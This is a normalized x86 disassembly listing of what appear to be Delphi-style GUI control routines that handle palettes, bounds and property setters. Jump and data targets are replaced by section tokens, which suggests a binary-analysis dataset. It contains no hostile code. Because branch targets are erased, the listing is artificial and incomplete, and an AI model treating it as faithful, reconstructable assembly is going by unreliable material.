mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jae r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x14 ]
jae r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x14 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jbe r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
jbe r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
sub_42b26c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_42b290
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c200
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
pop ecx
pop ecx
pop ebp
retn
sub_42b2b4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b393
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b39a
lea eax [ ebp - 0x24 ]
call sub_44cae0
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov bx 0xffef
call sub_44c24c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
cmp [ eax + 0x68 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ax [ eax + 0x68 ]
call sub_40672c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_446fac
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_44cb34
sub_42b3b4
push ebp
mov ebp esp
add esp 0xfffffff4
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b429
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40491c
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_42c9ec
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov edx [ eax + 0x54 ]
pop eax
call sub_44ce70
je r-xdata
mov [ ebp - 0x5 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b430
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
mov al 0x1
sub_42b438
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404964
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x4c ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
cmp bl [ eax + 0x59 ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42b484
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4049ac
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov eax [ eax + 0x70 ]
call sub_44ce70
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42b4d0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404a18
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ r-xdata ]
call sub_44c200
mov al [ eax + 0x6a ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x18 ]
cmp al [ edx + 0x47 ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42b514
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_442e2c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov eax [ eax + 0x108 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
cmp eax [ edx + 0x30 ]
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42b550
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_42ca2c
sub_42b57c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
sub_42b5a8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
add eax 0x70
mov edx [ ebp - 0x8 ]
call sub_44cb34
sub_42b5d8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_42c838
sub_42b604
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x108 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x10c ] edx
sub_42b634
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_442100
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
mov eax [ eax ]
mov eax [ eax + 0x6c ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
mov [ eax + 0x40 ] edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40e7d8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x58 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_42cad4
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x51 ] dl
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b078
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x1c ] edx
mov [ eax + 0x18 ] sub_42dc9c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x60 ] 0x80000005
mov eax [ ebp - 0x4 ]
mov [ eax + 0x47 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4a ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8a ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4e ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x6a ] 0xfff4
mov eax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42b750
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_423d48
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
test [ eax + 0x20 ] 0x8
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
call sub_42df28
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42c198
lea ecx [ ebp - 0x18 ]
or edx 0xffffffff
mov eax [ ebp - 0x4 ]
mov bx 0xffd1
call sub_44c24c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x90 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
call sub_446a6c
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44215c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
sub_42b8bc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
sub_42b8f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
mov al [ ebp - 0x6 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov bx 0xffdc
call sub_44c24c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
xor al 0x1
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectPalette
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
push eax
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectPalette
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call ReleaseDC
mov [ ebp - 0x6 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
sub_42b988
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42b9b4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x51 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x51 ] al
mov eax [ ebp - 0x4 ]
call sub_42bdc0
sub_42b9e0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x40 ] 0x8000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_44c070
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
mov eax [ ebp - 0x4 ]
and [ eax + 0x40 ] 0xffff7fff
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_42f05c
mov eax [ ebp - 0x8 ]
test [ eax + 0x20 ] 0x1
setne cl
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfff0
call sub_44c24c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44222c
mov eax [ ebp - 0x4 ]
mov bx 0xffde
call sub_44c24c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
call [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42ba8c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x4b ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x51 ]
setne [ ebp - 0x5 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42bad0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_4301e8
sub_42baf4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_42bb20
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x44 ] 0x8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4427c4
mov eax [ ebp - 0x4 ]
and [ eax + 0x44 ] 0xfff7
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
pop ecx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_42df28
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_42df28
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax [ ebp - 0x4 ]
call sub_42df28
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_42df28
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42bbcc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4425a0
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_42b988
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42c980
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42b9e0
sub_42bc24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffd5
call sub_44c24c
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4b ]
mov [ ebp - 0x6 ] al
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4b ] al
xor eax eax
mov al [ ebp - 0x5 ]
mov dl [ eax + rw-data ]
mov eax [ ebp - 0x4 ]
call sub_42b9b4
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov al [ ebp - 0x6 ]
dec eax
sub al 0x2
setb al
mov dl [ ebp - 0x5 ]
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffef
call sub_44c24c
mov al [ ebp - 0x6 ]
test al al
je r-xdata
sub al 0x5
je r-xdata
mov al [ ebp - 0x5 ]
test al al
je r-xdata
sub al 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
jmp r-xdata
sub_42bcf0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_42e5e4
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x30 ]
jne r-xdata
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x47 ]
mov eax [ ebp - 0x4 ]
call sub_42d084
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
call sub_42bdc0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x74 ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax [ ebp - 0x4 ]
call sub_42df28
mov eax [ ebp - 0x4 ]
mov bx 0xffd5
call sub_44c24c
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x34 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffd4
call sub_44c24c
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x38 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
je r-xdata
sub_42bdc0
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x52 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x51 ]
mov [ ebp - 0x5 ] al
mov al [ r-xdata ]
cmp al [ ebp - 0x5 ]
je r-xdata
test [ ebp - 0x5 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
sar eax 0x1
jns r-xdata
test [ ebp - 0x5 ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x78 ] eax
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x78 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x78 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
sar eax 0x1
jns r-xdata
test [ ebp - 0x5 ] 0x2
je r-xdata
test [ ebp - 0x5 ] 0x8
je r-xdata
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7c ] eax
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
test [ eax + 0x20 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x80 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov eax [ eax + 0x3c ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x84 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x80 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x84 ] edx
jmp r-xdata
sub_42bef4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ ebp - 0x4 ]
or [ eax + 0x88 ] 0x1
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42bf30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ ebp - 0x4 ]
